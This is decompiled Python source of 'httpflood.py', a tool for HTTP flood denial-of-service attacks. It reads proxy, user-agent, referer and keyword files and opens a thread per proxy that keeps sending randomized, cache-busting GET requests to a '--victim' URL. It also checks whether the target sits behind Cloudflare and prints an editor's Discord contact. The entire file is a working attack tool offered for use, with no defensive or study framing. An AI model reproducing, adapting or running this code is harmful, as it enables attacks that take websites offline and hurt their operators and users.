# uncompyle6 version 3.3.5
# Python bytecode 3.5 (3351)
# Decompiled from: Python 3.7.3 (default, Apr  3 2019, 05:39:12) 
# [GCC 8.3.0]
# Embedded file name: httpflood.py
# Compiled at: 2019-07-02 20:45:28
# Size of source mod 2**32: 5920 bytes
import sys, os, threading, random, requests, time, getopt, socket
from threading import Thread, Event
from netaddr import IPNetwork, IPAddress
from requests.auth import HTTPBasicAuth
from urllib.parse import urlparse
import requests
VERSION = (0, 1, 3)
__version__ = '%d.%d.%d' % VERSION[0:3]
if sys.version_info[0:2] < (3, 5):
    raise RuntimeError('Python 3.5 or higher is required!')
proxy_file = 'proxy.txt'
ua_file = 'user-agents.txt'
ref_file = 'referers.txt'
keywords_file = 'keywords.txt'
ex = Event()
ips = []
ref = []
keyword = []
ua = []
timeout = 10
proto = ''
url = ''
auth = False
auth_login = ''
auth_pass = ''

def main(argv):
    global auth
    global auth_login
    global auth_pass
    global proto
    global timeout
    global url
    try:
        opts, args = getopt.getopt(argv, 'hv:a:t:', ['help', 'victim=', 'auth=', 'timeout='])
    except getopt.GetoptError as err:
        print(err)
        showUsage()
        sys.exit(2)
    else:
        for opt, arg in opts:
            if opt in ('-h', '--help'):
                showUsage()
                sys.exit(2)
            elif opt in ('-v', '--victim'):
                if len(arg) >= 1:
                    url = arg
                    link = urlparse(url)
                    proto = link.scheme
                else:
                    print('Parameter [Target] must be a string and not to be empty!')
                    sys.exit(2)
            elif opt in ('-a', '--auth'):
                auth = True
                auth_login = arg.split(':')[0]
                auth_pass = arg.split(':')[1]
            elif opt in ('-t', '--timeout'):
                arg = int(arg)
                if isinstance(arg, int) and arg >= 1:
                    timeout = arg
                else:
                    print('Parameter [--timeout] must be an integer and not to be less than 1')
                    sys.exit(2)

        parseFiles()


def parseFiles():
    global ips
    global keyword
    global ref
    global ua
    try:
        if os.stat(proxy_file).st_size > 0:
            with open(proxy_file) as (proxy):
                ips = [row.rstrip() for row in proxy]
        else:
            print('Error: Proxies %s not detected!' % proxy_file)
            sys.exit()
    except OSError:
        print('Error: %s was not found!' % proxy_file)
        sys.exit()
    else:
        try:
            if os.stat(ua_file).st_size > 0:
                with open(ua_file) as (user_agents):
                    ua = [row.rstrip() for row in user_agents]
            else:
                print('Error: File %s is empty' % ua_file)
                sys.exit()
        except OSError:
            print('Error: %s was not found!' % ua_file)
            sys.exit()
        else:
            try:
                if os.stat(ref_file).st_size > 0:
                    with open(ref_file) as (referers):
                        ref = [row.rstrip() for row in referers]
                else:
                    print('Error: File %s is empty!' % ref_file)
                    sys.exit()
            except OSError:
                print('Error: %s was not found!' % ref_file)
                sys.exit()
            else:
                try:
                    if os.stat(keywords_file).st_size > 0:
                        with open(keywords_file) as (keywords):
                            keyword = [row.rstrip() for row in keywords]
                    else:
                        print('Error: File %s is empty!' % keywords_file)
                        sys.exit()
                except OSError:
                    print('Error: %s was not found!' % keywords_file)
                    sys.exit()
                else:
                    print('HTTPFLOOD-Loader: {} Proxies, {} bots, {} referers, {} keywords'.format(len(ips), len(ua), len(ref), len(keyword)))
                    cloudFlareCheck()


def request(index):
    err_count = 0
    only_gzip = 0
    while not ex.is_set():
        payload = {random.choice(keyword): random.choice(keyword)}
        headers = {'User-Agent': random.choice(ua), 
         'Referer': random.choice(ref) + random.choice(keyword), 
         'Accept-Encoding': 'gzip;q=0,deflate;q=0' if only_gzip < 5 else 'identity, deflate, compress, gzip, sdch, br', 
         'Cache-Control': 'no-cache, no-store, must-revalidate', 
         'Pragma': 'no-cache'}
        proxy = {proto: ips[index]}
        try:
            if auth:
                r = requests.get(url, params=payload, headers=headers, proxies=proxy, timeout=timeout, auth=HTTPBasicAuth(auth_login, auth_pass))
            else:
                r = requests.get(url, params=payload, headers=headers, proxies=proxy, timeout=timeout)
            if r.status_code == 406 and only_gzip < 5:
                only_gzip += 1
        except requests.exceptions.ChunkedEncodingError:
            err_count += 1
        except requests.exceptions.ConnectionError:
            err_count += 1
        except requests.exceptions.ReadTimeout:
            pass

        if err_count >= 20:
            print('Bot ' + ips[index] + ' Loading...')
            return


def cloudFlareCheck():
    if isCloudFlare(url) is True:
        print('Yor Target is protected with CDN')
        time.sleep(1)
        for i in range(5, 0, -1):
            print('HttpFlood will started in ' + str(i) + ' seconds...', end='\r')
            time.sleep(1)

        print('\nHttpFlood Has Been Started.')
        startAttack()
    else:
        print('Script Edited by Leolynn, contact me on discord Leolynn#5271')
        startAttack()


def startAttack():
    threads = []
    for i in range(len(ips)):
        t = threading.Thread(target=request, args=(i,))
        t.daemon = True
        t.start()
        threads.append(t)

    try:
        while True:
            time.sleep(0.05)

    except KeyboardInterrupt:
        ex.set()
        print('\rAttack has been stopped!\nGive up to ' + str(timeout) + ' seconds to release the threads...')
        for t in threads:
            t.join()


def isCloudFlare(link):
    parsed_uri = urlparse(link)
    domain = '{uri.netloc}'.format(uri=parsed_uri)
    try:
        origin = socket.gethostbyname(domain)
        iprange = requests.get('https://www.cloudflare.com/ips-v4').text
        ipv4 = [row.rstrip() for row in iprange.splitlines()]
        for i in range(len(ipv4)):
            if addressInNetwork(origin, ipv4[i]):
                return True

    except socket.gaierror:
        print("Unable to verify if victim's IP address belong to a CloudFlare's subnet")
        return


def addressInNetwork(ip, net):
    if IPAddress(ip) in IPNetwork(net):
        return True


def showUsage():
    print("Usage: cf.py [-v] <victim's url> [-t] <timeout>\n")


if __name__ == '__main__':
    main(sys.argv[1:])